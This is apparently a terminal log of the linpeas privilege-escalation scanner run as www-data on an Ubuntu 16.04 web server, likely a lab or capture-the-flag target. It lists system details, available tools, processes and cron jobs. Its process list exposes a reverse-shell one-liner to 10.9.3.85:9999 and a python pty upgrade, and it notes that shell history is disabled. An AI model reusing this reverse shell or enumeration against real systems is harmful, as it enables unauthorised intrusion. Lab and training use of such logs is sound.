[48;2;73;218;37m[38;2;73;217;37m‚ñÑ[48;2;73;218;37m[38;2;72;217;36m‚ñÑ[48;2;73;218;37m[38;2;67;203;34m‚ñÑ[48;2;68;194;37m[38;2;40;116;21m‚ñÑ[48;2;58;142;36m[38;2;8;21;5m‚ñÑ[48;2;49;120;31m[38;2;6;10;5m‚ñÑ[48;2;25;59;16m[38;2;73;108;65m‚ñÑ[48;2;15;33;11m[38;2;95;157;79m‚ñÑ[48;2;12;25;9m[38;2;97;175;77m‚ñÑ[48;2;21;32;19m[38;2;99;179;79m‚ñÑ[48;2;23;35;19m[38;2;98;178;78m‚ñÑ[48;2;20;34;17m[38;2;98;178;78m‚ñÑ[48;2;13;24;11m[38;2;98;178;78m‚ñÑ[48;2;16;26;14m[38;2;98;177;78m‚ñÑ[0m
  [48;2;97;176;77m[38;2;58;103;46m‚ñÑ[48;2;98;177;78m[38;2;94;170;75m‚ñÑ[48;2;98;177;78m[38;2;99;179;79m‚ñÑ[48;2;98;177;78m[38;2;97;176;77m‚ñÑ[48;2;97;176;77m[38;2;98;177;78m‚ñÑ[48;2;91;165;72m[38;2;98;177;78m‚ñÑ[48;2;55;100;44m[38;2;98;177;78m‚ñÑ[48;2;15;27;10m[38;2;92;168;73m‚ñÑ[48;2;24;46;18m[38;2;76;138;61m‚ñÑ[48;2;73;154;53m[38;2;54;96;43m‚ñÑ[48;2;74;213;39m[38;2;24;48;18m‚ñÑ[48;2;74;222;37m[38;2;20;55;11m‚ñÑ[48;2;73;217;37m[38;2;31;91;16m‚ñÑ[48;2;73;218;37m[38;2;49;145;24m‚ñÑ[48;2;73;218;37m[38;2;68;201;35m‚ñÑ[48;2;73;218;37m[38;2;73;217;37m‚ñÑ[48;2;73;218;37m[38;2;74;220;37m‚ñÑ[48;2;73;218;37m[38;2;73;219;37m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;73;220;37m‚ñÑ[48;2;73;218;37m[38;2;72;214;37m‚ñÑ[48;2;73;218;37m[38;2;63;187;32m‚ñÑ[48;2;72;217;36m[38;2;41;120;22m‚ñÑ[48;2;74;222;36m[38;2;21;52;13m‚ñÑ[48;2;67;203;34m[38;2;39;62;34m‚ñÑ[48;2;40;117;21m[38;2;64;103;54m‚ñÑ[48;2;14;43;7m[38;2;72;126;57m‚ñÑ[48;2;4;12;2m[38;2;87;156;69m‚ñÑ[48;2;25;45;21m[38;2;97;174;78m‚ñÑ[48;2;71;124;57m[38;2;99;177;80m‚ñÑ[48;2;97;168;78m[38;2;94;170;75m‚ñÑ[48;2;96;175;77m[38;2;103;177;84m‚ñÑ[48;2;98;176;79m[38;2;109;183;90m‚ñÑ[48;2;100;178;80m[38;2;112;185;94m‚ñÑ[48;2;100;177;80m[38;2;111;184;92m‚ñÑ[48;2;99;177;80m[38;2;107;182;89m‚ñÑ[48;2;98;177;78m[38;2;105;182;85m‚ñÑ[48;2;98;177;78m[38;2;103;180;83m‚ñÑ[48;2;98;177;78m[38;2;99;177;79m‚ñÑ[0m
   [48;2;99;106;96m[38;2;254;254;254m‚ñÑ[48;2;54;79;47m[38;2;236;236;236m‚ñÑ[48;2;72;123;60m[38;2;134;134;134m‚ñÑ[48;2;97;176;78m[38;2;65;87;60m‚ñÑ[48;2;98;177;78m[38;2;73;130;59m‚ñÑ[48;2;98;177;78m[38;2;91;165;72m‚ñÑ[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;96;172;77m[38;2;98;177;78m‚ñÑ[48;2;82;147;65m[38;2;98;177;78m‚ñÑ[48;2;66;116;52m[38;2;98;177;78m‚ñÑ[48;2;46;78;38m[38;2;98;177;78m‚ñÑ[48;2;27;51;20m[38;2;98;177;78m‚ñÑ[48;2;28;60;20m[38;2;94;169;74m‚ñÑ[48;2;28;67;19m[38;2;86;155;69m‚ñÑ[48;2;34;96;19m[38;2;69;123;54m‚ñÑ[48;2;42;126;21m[38;2;48;86;39m‚ñÑ[48;2;51;148;27m[38;2;36;64;28m‚ñÑ[48;2;55;164;28m[38;2;26;46;20m‚ñÑ[48;2;60;180;30m[38;2;23;39;18m‚ñÑ[48;2;62;186;31m[38;2;21;40;17m‚ñÑ[48;2;61;181;31m[38;2;19;36;16m‚ñÑ[48;2;67;176;40m[38;2;18;32;14m‚ñÑ[48;2;63;173;35m[38;2;23;36;19m‚ñÑ[48;2;56;168;29m[38;2;27;42;23m‚ñÑ[48;2;53;160;27m[38;2;29;45;24m‚ñÑ[48;2;44;133;22m[38;2;30;53;25m‚ñÑ[48;2;34;102;17m[38;2;52;89;43m‚ñÑ[48;2;20;60;10m[38;2;88;148;71m‚ñÑ[48;2;24;47;19m[38;2;97;171;78m‚ñÑ[48;2;34;62;27m[38;2;98;177;78m‚ñÑ[48;2;55;99;44m[38;2;98;177;78m‚ñÑ[48;2;80;144;64m[38;2;98;177;78m‚ñÑ[48;2;99;176;79m[38;2;98;177;78m‚ñÑ[48;2;98;177;78m [48;2;98;177;78m[38;2;99;177;79m‚ñÑ[48;2;99;177;79m[38;2;96;172;76m‚ñÑ[48;2;99;175;79m[38;2;85;151;68m‚ñÑ[48;2;95;169;76m[38;2;72;121;60m‚ñÑ[48;2;109;180;92m[38;2;37;57;32m‚ñÑ[48;2;100;159;85m[38;2;38;41;36m‚ñÑ[48;2;72;107;62m[38;2;74;74;74m‚ñÑ[48;2;44;65;38m[38;2;134;134;134m‚ñÑ[48;2;31;48;27m[38;2;200;200;200m‚ñÑ[48;2;31;48;26m[38;2;226;226;226m‚ñÑ[48;2;31;52;25m[38;2;205;205;205m‚ñÑ[48;2;41;71;34m[38;2;170;170;170m‚ñÑ[48;2;59;97;50m[38;2;142;142;142m‚ñÑ[0m
        [48;2;95;106;94m[38;2;253;253;253m‚ñÑ[48;2;81;137;65m[38;2;243;243;243m‚ñÑ[48;2;91;166;73m[38;2;182;185;181m‚ñÑ[48;2;95;174;76m[38;2;61;73;59m‚ñÑ[48;2;98;177;78m[38;2;33;66;26m‚ñÑ[48;2;98;177;78m[38;2;81;143;65m‚ñÑ[48;2;98;177;78m[38;2;102;182;81m‚ñÑ[48;2;98;177;78m[38;2;97;176;77m‚ñÑ[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;178;78m[38;2;98;177;78m‚ñÑ[48;2;98;179;78m[38;2;98;177;78m‚ñÑ[48;2;98;179;78m[38;2;98;177;78m‚ñÑ[48;2;99;179;78m[38;2;98;177;78m‚ñÑ[48;2;98;179;78m[38;2;98;177;78m‚ñÑ[48;2;98;178;78m[38;2;98;177;78m‚ñÑ[48;2;98;178;78m[38;2;98;177;78m‚ñÑ[48;2;98;178;78m[38;2;98;177;78m‚ñÑ[48;2;98;179;78m[38;2;98;177;78m‚ñÑ[48;2;97;177;77m[38;2;98;177;78m‚ñÑ[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;78m‚ñÑ[48;2;98;177;78m[38;2;99;179;78m‚ñÑ[48;2;98;177;78m[38;2;93;169;74m‚ñÑ[48;2;98;177;78m[38;2;56;106;44m‚ñÑ[48;2;96;174;77m[38;2;16;31;13m‚ñÑ[48;2;68;126;54m[38;2;58;58;58m‚ñÑ[48;2;28;50;23m[38;2;180;180;180m‚ñÑ[48;2;20;22;20m[38;2;240;240;240m‚ñÑ[48;2;86;85;86m[38;2;253;253;253m‚ñÑ[48;2;199;199;199m[38;2;255;255;255m‚ñÑ [0m
             [48;2;146;147;145m[38;2;254;254;254m‚ñÑ[48;2;41;52;39m[38;2;242;242;242m‚ñÑ[48;2;39;76;30m[38;2;192;192;192m‚ñÑ[48;2;73;136;57m[38;2;132;134;132m‚ñÑ[48;2;90;162;72m[38;2;96;100;95m‚ñÑ[48;2;99;175;79m[38;2;60;69;58m‚ñÑ[48;2;98;177;78m[38;2;46;59;43m‚ñÑ[48;2;98;177;78m[38;2;32;51;27m‚ñÑ[48;2;98;178;78m[38;2;28;50;23m‚ñÑ[48;2;98;178;78m[38;2;28;55;22m‚ñÑ[48;2;98;178;78m[38;2;35;64;28m‚ñÑ[48;2;98;177;78m[38;2;41;75;33m‚ñÑ[48;2;98;177;78m[38;2;50;89;41m‚ñÑ[48;2;98;177;77m[38;2;54;89;45m‚ñÑ[48;2;98;177;77m[38;2;53;89;44m‚ñÑ[48;2;98;177;78m[38;2;49;86;39m‚ñÑ[48;2;98;177;78m[38;2;45;83;36m‚ñÑ[48;2;98;177;78m[38;2;40;74;32m‚ñÑ[48;2;98;177;78m[38;2;35;64;28m‚ñÑ[48;2;98;178;78m[38;2;39;60;33m‚ñÑ[48;2;90;163;71m[38;2;55;61;53m‚ñÑ[48;2;53;97;41m[38;2;111;111;111m‚ñÑ[48;2;24;44;19m[38;2;186;186;186m‚ñÑ[48;2;36;41;35m[38;2;242;242;242m‚ñÑ[48;2;132;131;132m[38;2;255;255;255m‚ñÑ[0m
  [1;34m  linpeas v3.0.4 [1;33mby carlospolop
[0m
[1;33mADVISORY: [1;34mThis script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
[0m
[1;34mLinux Privesc Checklist: [1;33mhttps://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
[0m [1;4mLEGEND[0m:
  [1;31;103mRED/YELLOW[0m: 95% a PE vector
  [1;31mRED[0m: You must take a look at it
  [1;96mLightCyan[0m: Users with console
  [1;34mBlue[0m: Users without console & mounted devs
  [1;32mGreen[0m: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangeta: Your username

 [1;90mStarting linpeas. Caching Writable Folders...[0m

[1;34m====================================( [1;32mBasic information[1;34m )=====================================
[0m[1;37mOS: [0mLinux version[1;31m 4.4.0[0m-142-generic (buildd@lgw01-amd64-033) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
[1;37mUser & Groups: [0muid=33([1;34m[1;32m[1;95mwww-data[0m[0m[0m) gid=33([1;34m[1;32m[1;95mwww-data[0m[0m[0m) groups=33([1;34m[1;32m[1;95mwww-data[0m[0m[0m)
[1;37mHostname: [0mubuntu
[1;37mWritable folder: [0m/dev/shm
[1;33m[+] [1;32m/bin/ping[1;34m is available for network discovery[1;37m (linpeas can discover hosts, learn more with -h)
[0m[1;33m[+] [1;32m/bin/nc[1;34m is available for network discover & port scanning[1;37m (linpeas can discover hosts and scan ports, learn more with -h)
[0m

[1;32mCaching directories using 1 threads [0m[1;31m. [0m[1;31m. [0m[1;31m. [0m[1;32m. [0m[1;31m. [0m[1;32m. [0m[1;32m. [0m[1;32m. [0m[1;32m. [0m[1;31m. [0m[1;31m. [0m[1;31m. [0m[1;32m. [0m[1;32m. [0m[1;31m. [0m[1;32m. [0m[1;31m. [0m[1;31m. [0m[1;32m. [0m[1;32m. [0m[1;31m. [0m[1;32m. [0m[1;32m. [0m[1;32m. [0m[1;33mDONE
[0m[1;34m====================================( [1;32mSystem Information[1;34m )====================================
[0m[1;33m[+] [1;32mOperative system
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
[0mLinux version[1;31m 4.4.0[0m-142-generic (buildd@lgw01-amd64-033) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.6 LTS
Release:	16.04
Codename:	xenial

[1;33m[+] [1;32mSudo version
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
[0mSudo version [1;31m1.8.16[0m

[1;33m[+] [1;32mUSBCreator
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
[0m
[1;33m[+] [1;32mPATH
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
[0m/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[1;33m[+] [1;32mDate
[0mSat Apr  3 09:33:35 PDT 2021

[1;33m[+] [1;32mSystem stats
[0mFilesystem      Size  Used Avail Use% Mounted on
udev            225M     0  225M   0% /dev
tmpfs            49M  1.7M   47M   4% /run
/dev/xvda1       19G  2.7G   15G  16% /
tmpfs           244M     0  244M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           244M     0  244M   0% /sys/fs/cgroup
              total        used        free      shared  buff/cache   available
Mem:         497972      178296       13560        9748      306116      285140
Swap:        998396        1064      997332

[1;33m[+] [1;32mCPU info
[0mArchitecture:          x86_64
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                1
On-line CPU(s) list:   0
Thread(s) per core:    1
Core(s) per socket:    1
Socket(s):             1
NUMA node(s):          1
Vendor ID:             GenuineIntel
CPU family:            6
Model:                 63
Model name:            Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz
Stepping:              2
CPU MHz:               2400.050
BogoMIPS:              4800.10
Hypervisor vendor:     Xen
Virtualization type:   full
L1d cache:             32K
L1i cache:             32K
L2 cache:              256K
L3 cache:              30720K
NUMA node0 CPU(s):     0
Flags:                 fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht syscall nx rdtscp lm constant_tsc rep_good nopl xtopology pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm invpcid_single kaiser fsgsbase bmi1 avx2 smep bmi2 erms invpcid xsaveopt

[1;33m[+] [1;32mEnvironment
[0m[1;34m[i] [1;33mAny private information inside environment variables?
[0mHISTFILESIZE=0
SHLVL=2
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
_=./linpeas.sh
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
SHELL=bash
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
HISTFILE=/dev/null

[1;33m[+] [1;32mSearching Signature verification failed in dmseg
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
[0m[1;90m Not Found
[0m
[1;33m[+] [1;32mAppArmor enabled? .............. [0mYou do not have enough privilege to read the profile set.
apparmor module is loaded.
[1;33m[+] [1;32mgrsecurity present? ............ [0m[1;90mgrsecurity Not Found
[0m[1;33m[+] [1;32mPaX bins present? .............. [0m[1;90mPaX Not Found
[0m[1;33m[+] [1;32mExecshield enabled? ............ [0m[1;90mExecshield Not Found
[0m[1;33m[+] [1;32mSELinux enabled? ............... [0m[1;90msestatus Not Found
[0m[1;33m[+] [1;32mIs ASLR enabled? ............... [0m[1;32mYes[0m
[1;33m[+] [1;32mPrinter? ....................... [0m[1;90mlpstat Not Found
[0m[1;33m[+] [1;32mIs this a virtual machine? ..... [0m[1;31mYes (xen)[0m
[1;33m[+] [1;32mIs this a container? ........... [0m[1;90mNo
[0m[1;33m[+] [1;32mAny running containers? ........ [0m[1;90mNo
[0m

[1;34m=========================================( [1;32mDevices[1;34m )==========================================
[0m[1;33m[+] [1;32mAny sd*/disk* disk in /dev? (limit 20)
[0mdisk

[1;33m[+] [1;32mUnmounted file-system?
[0m[1;34m[i] [1;33mCheck if you can mount umounted devices
[0m[1;34mUUID=bc34e198-f496-44b4-a1a3-1042e764ff86[0m	/	ext4	errors=remount-ro	0 1
UUID=a27379eb-e474-4aca-a8e4-9cd5686a926e	none	[1;32mswap[0m	sw	0 0


[1;34m====================================( [1;32mAvailable Software[1;34m )====================================
[0m[1;33m[+] [1;32mUseful software
[0m/bin/nc
/bin/netcat
/usr/bin/wget
/bin/ping
/usr/bin/gcc
/usr/bin/g++
/usr/bin/make
/usr/bin/gdb
/usr/bin/base64
/usr/bin/socat
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo

[1;33m[+] [1;32mInstalled Compiler
[0mii  g++                                 4:5.3.1-1ubuntu1                           amd64        GNU C++ compiler
ii  g++-5                               5.4.0-6ubuntu1~16.04.12                    amd64        GNU C++ compiler
ii  gcc                                 4:5.3.1-1ubuntu1                           amd64        GNU C compiler
ii  gcc-5                               5.4.0-6ubuntu1~16.04.12                    amd64        GNU C compiler
/usr/bin/gcc
/usr/bin/g++


[1;34m================================( [1;32mProcesses, Cron, Services, Timers & Sockets[1;34m )================================
[0m[1;33m[+] [1;32mCleaned processes
[0m[1;34m[i] [1;33mCheck weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
[0m[1;31mroot[0m         1  0.0  0.9  37848  4540 ?        Ss   07:18   0:04 /sbin/init noprompt
[1;31mroot[0m       203  0.0  0.5  27704  2496 ?        Ss   07:18   0:00 /lib/[1;34msys[0mtemd/systemd-journald
[1;31mroot[0m       260  0.0  0.7  45104  3684 ?        Ss   07:18   0:01 /lib/[1;34msys[0mtemd/systemd-[1;32mudev[0md
[1;34msys[0mtemd+   297  0.0  0.4 100324  2276 ?        Ssl  07:18   0:00 /lib/systemd/systemd-timesyncd
    |--(Caps) 0x0000000002000000=cap_sys_time
[1;31mroot[0m       515  0.0  0.4  16124  2052 ?        Ss   07:18   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
[1;31mroot[0m       552  0.0  0.2  20096  1168 ?        Ss   07:18   0:00 /lib/[1;34msys[0mtemd/systemd-logind
[1;34m[1;32msyslog[0m[0m     555  0.0  0.6 256392  3092 ?        Ssl  07:18   0:00 /usr/sbin/rsyslogd -n
[1;32mmessage+[0m   556  0.0  0.7  42900  3772 ?        Ss   07:18   0:00 /usr/bin/dbus-[1;34mdaemon[0m --system --address=systemd: --nofork --nopidfile --systemd-activation
    |--(Caps) 0x0000000020000000=cap_audit_write
[1;31mroot[0m       585  0.0  0.5  29008  2500 ?        Ss   07:18   0:00 /usr/sbin/[1;32mcron[0m -f
[1;31mroot[0m       586  0.0  1.1 275864  5564 ?        Ssl  07:18   0:00 /usr/lib/accountsservice/accounts-[1;34m[1;32mdaemon[0m[0m
[1;31mroot[0m       625  0.0  0.3  15936  1512 tty1     Ss+  07:18   0:00 /sbin/agetty --noclear tty1 linux
[1;31mroot[0m       626  0.0  0.3  15752  1764 ttyS0    Ss+  07:18   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
[1;34mmysql[0m      666  0.0 29.5 1126788 146948 ?      Ssl  07:18   0:06 /usr/sbin/mysqld
[1;31mroot[0m       678  0.0  1.1  65512  5856 ?        Ss   07:18   0:00 /usr/sbin/[1;34msshd[0m -D
[1;31mroot[0m       703  0.0  4.4 258264 22392 ?        Ss   07:18   0:00 /usr/sbin/[1;32m[1;31mapache2[0m[0m -k start
[1;34m[1;32m[1;95mwww-data[0m[0m[0m   855  0.0  2.1 258732 10576 ?        S    07:30   0:00  _ /usr/sbin/[1;32m[1;31mapache2[0m[0m -k start
[1;34m[1;32m[1;95mwww-data[0m[0m[0m   858  0.0  2.1 258724 10556 ?        S    07:30   0:00  _ /usr/sbin/[1;32m[1;31mapache2[0m[0m -k start
[1;34m[1;32m[1;95mwww-data[0m[0m[0m   869  0.0  2.1 258732 10564 ?        S    07:33   0:00  _ /usr/sbin/[1;32m[1;31mapache2[0m[0m -k start
[1;34m[1;32m[1;95mwww-data[0m[0m[0m   871  0.0  2.1 258732 10560 ?        S    07:33   0:00  _ /usr/sbin/[1;32m[1;31mapache2[0m[0m -k start
[1;34m[1;32m[1;95mwww-data[0m[0m[0m   878  0.0  2.1 258724 10560 ?        S    07:38   0:00  _ /usr/sbin/[1;32m[1;31mapache2[0m[0m -k start
[1;34m[1;32m[1;95mwww-data[0m[0m[0m   921  0.0  2.2 258724 11236 ?        S    07:40   0:00  _ /usr/sbin/[1;32m[1;31mapache2[0m[0m -k start
[1;34m[1;32m[1;95mwww-data[0m[0m[0m   936  0.0  2.1 258724 10556 ?        S    07:43   0:00  _ /usr/sbin/[1;32m[1;31mapache2[0m[0m -k start
[1;34m[1;32m[1;95mwww-data[0m[0m[0m  1077  0.0  0.1   4504   736 ?        S    08:46   0:00  |   _ sh -c bash -c 'exec bash -i &>/dev/tcp/10.9.3.85/9999 <&1'
[1;34m[1;32m[1;95mwww-data[0m[0m[0m  1078  0.0  0.6  18212  3008 ?        S    08:46   0:00  |       _ bash -i
[1;34m[1;32m[1;95mwww-data[0m[0m[0m  1081  0.0  1.3  32116  6752 ?        S    08:47   0:00  |           _ python -c import pty;pty.spawn("/bin/bash")
[1;34m[1;32m[1;95mwww-data[0m[0m[0m  1082  0.0  0.6  18244  3188 pts/0    Ss   08:47   0:00  |               _ /bin/bash
[1;34m[1;32m[1;95mwww-data[0m[0m[0m  1207  0.0  0.4   4708  2028 pts/0    S+   09:33   0:00  |                   _ /bin/sh ./linpeas.sh
[1;34m[1;32m[1;95mwww-data[0m[0m[0m  1846  0.0  0.0   4708   424 pts/0    S+   09:33   0:00  |                       _ /bin/sh ./linpeas.sh
cat: /proc/1846/status: No such file or directory
    |--(Caps) 0x0000000000000000=
[1;34m[1;32m[1;95mwww-data[0m[0m[0m  1850  0.0  0.5  34556  2904 pts/0    R+   09:33   0:00  |                       |   _ ps fauxwww
cat: /proc/1850/status: No such file or directory
    |--(Caps) 0x0000000000000000=
[1;34m[1;32m[1;95mwww-data[0m[0m[0m  1849  0.0  0.0   4708   424 pts/0    S+   09:33   0:00  |                       _ /bin/sh ./linpeas.sh
[1;34m[1;32m[1;95mwww-data[0m[0m[0m   937  0.0  2.2 258724 11024 ?        S    07:43   0:00  _ /usr/sbin/[1;32m[1;31mapache2[0m[0m -k start
[1;34m[1;32m[1;95mwww-data[0m[0m[0m   938  0.0  2.1 258724 10556 ?        S    07:43   0:00  _ /usr/sbin/[1;32m[1;31mapache2[0m[0m -k start
[1;34m[1;32m[1;95mwww-data[0m[0m[0m   941  0.0  2.1 258724 10560 ?        S    07:43   0:00  _ /usr/sbin/[1;32m[1;31mapache2[0m[0m -k start

[1;33m[+] [1;32mBinary processes permissions
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
[0m-rwxr-xr-x 1 [1;32mroot[0m root  1037528 May 16  2017 /bin/bash
lrwxrwxrwx 1 [1;32mroot[0m root        4 Jan 15  2020 /bin/sh -> dash
-rwxr-xr-x 1 [1;32mroot[0m root   326232 Feb 13  2019 /lib/[1;34msys[0mtemd/systemd-journald
-rwxr-xr-x 1 [1;32mroot[0m root   618520 Feb 13  2019 /lib/[1;34msys[0mtemd/systemd-logind
-rwxr-xr-x 1 [1;32mroot[0m root   141904 Feb 13  2019 /lib/[1;34msys[0mtemd/systemd-timesyncd
-rwxr-xr-x 1 [1;32mroot[0m root   453240 Feb 13  2019 /lib/[1;34msys[0mtemd/systemd-udevd
-rwxr-xr-x 1 [1;32mroot[0m root    44104 May 16  2018 /sbin/agetty
-rwxr-xr-x 1 [1;32mroot[0m root   487248 Mar  5  2018 /sbin/dhclient
lrwxrwxrwx 1 [1;32mroot[0m root       20 Jan 15  2020 /sbin/init -> /lib/[1;34msys[0mtemd/systemd
-rwxr-xr-x 1 [1;32mroot[0m root   224208 Jan 12  2017 /usr/bin/dbus-[1;34m[1;32mdaemon[0m[0m
-rwxr-xr-x 1 [1;32mroot[0m root   164928 Nov  3  2016 /usr/lib/accountsservice/accounts-[1;34m[1;32mdaemon[0m[0m
-rwxr-xr-x 1 [1;32mroot[0m root   662560 Oct  8  2019 /usr/sbin/apache2
-rwxr-xr-x 1 [1;32mroot[0m root    44472 Apr  5  2016 /usr/sbin/cron
-rwxr-xr-x 1 [1;32mroot[0m root 24544904 Nov 15  2019 /usr/sbin/[1;34mmysql[0md
-rwxr-xr-x 1 [1;32mroot[0m root   599328 Apr  5  2016 /usr/sbin/r[1;34m[1;32msyslog[0m[0md
-rwxr-xr-x 1 [1;32mroot[0m root   791024 Mar  4  2019 /usr/sbin/[1;34msshd[0m

[1;33m[+] [1;32mFiles opened by processes belonging to other users
[0m[1;34m[i] [1;33mThis is usually empty because of the lack of privileges to read other user processes information
[0mCOMMAND    PID TID             USER   FD      TYPE DEVICE SIZE/OFF    NODE NAME

[1;33m[+] [1;32mProcesses with credentials in memory (root req)
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
[0m[1;90mgdm-password Not Found
[0m[1;90mgnome-keyring-daemon Not Found
[0m[1;90mlightdm Not Found
[0m[1;90mvsftpd Not Found
[0m[1;31mapache2[0m process found (dump creds from memory as root)
[1;90msshd Not Found
[0m
[1;33m[+] [1;32mCron jobs
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
[0m/usr/bin/crontab
[1;90mincrontab Not Found
[0m-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 [1;32m.placeholder[0m
-rw-r--r--  1 root root  670 Jun 22  2017 [1;32mphp[0m
-rw-r--r--  1 root root  191 Jan 15  2020 [1;32mpopularity-contest[0m

/etc/cron.daily:
total 48
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 [1;32m.placeholder[0m
-rwxr-xr-x  1 root root  539 Jun 11  2018 [1;32mapache2[0m
-rwxr-xr-x  1 root root 1474 Oct  9  2018 [1;32mapt-compat[0m
-rwxr-xr-x  1 root root  355 May 22  2012 [1;32mbsdmainutils[0m
-rwxr-xr-x  1 root root 1597 Nov 26  2015 [1;32mdpkg[0m
-rwxr-xr-x  1 root root  372 May  5  2015 [1;32mlogrotate[0m
-rwxr-xr-x  1 root root 1293 Nov  6  2015 [1;32mman-db[0m
-rwxr-xr-x  1 root root  435 Nov 17  2014 [1;32mmlocate[0m
-rwxr-xr-x  1 root root  249 Nov 12  2015 [1;32mpasswd[0m
-rwxr-xr-x  1 root root 3449 Feb 26  2016 [1;32mpopularity-contest[0m

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 [1;32m.placeholder[0m

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 [1;32m.placeholder[0m

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rw-r--r--  1 root root  102 Apr  5  2016 [1;32m.placeholder[0m
-rwxr-xr-x  1 root root   86 Apr 13  2016 [1;32mfstrim[0m
-rwxr-xr-x  1 root root  771 Nov  6  2015 [1;32mman-db[0m

SHELL=/bin/sh
PATH=/usr/local/s[1;34mbin:[0m/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


[1;33m[+] [1;32mIncron
[0m[1;33m[+] [1;32mServices
[0m[1;34m[i] [1;33mSearch for outdated versions
[0m [ + ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ - ]  bootmisc.sh
 [ - ]  checkfs.sh
 [ - ]  checkroot-bootclean.sh
 [ - ]  checkroot.sh
 [ + ]  console-setup
 [ + ]  cron
 [ + ]  dbus
 [ + ]  grub-common
 [ - ]  hostname.sh
 [ - ]  hwclock.sh
 [ + ]  irqbalance
 [ + ]  keyboard-setup
 [ - ]  killprocs
 [ + ]  kmod
 [ - ]  mountall-bootclean.sh
 [ - ]  mountall.sh
 [ - ]  mountdevsubfs.sh
 [ - ]  mountkernfs.sh
 [ - ]  mountnfs-bootclean.sh
 [ - ]  mountnfs.sh
 [ + ]  mysql
 [ + ]  networking
 [ + ]  ondemand
 [ - ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rc.local
 [ + ]  resolvconf
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  sendsigs
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ - ]  umountfs
 [ - ]  umountnfs.sh
 [ - ]  umountroot
 [ + ]  urandom
 [ - ]  uuidd
 [ - ]  x11-common

[1;33m[+] [1;32mSystemd PATH
[0m[1;34m[i] [1;33mhttps://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
[0mPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

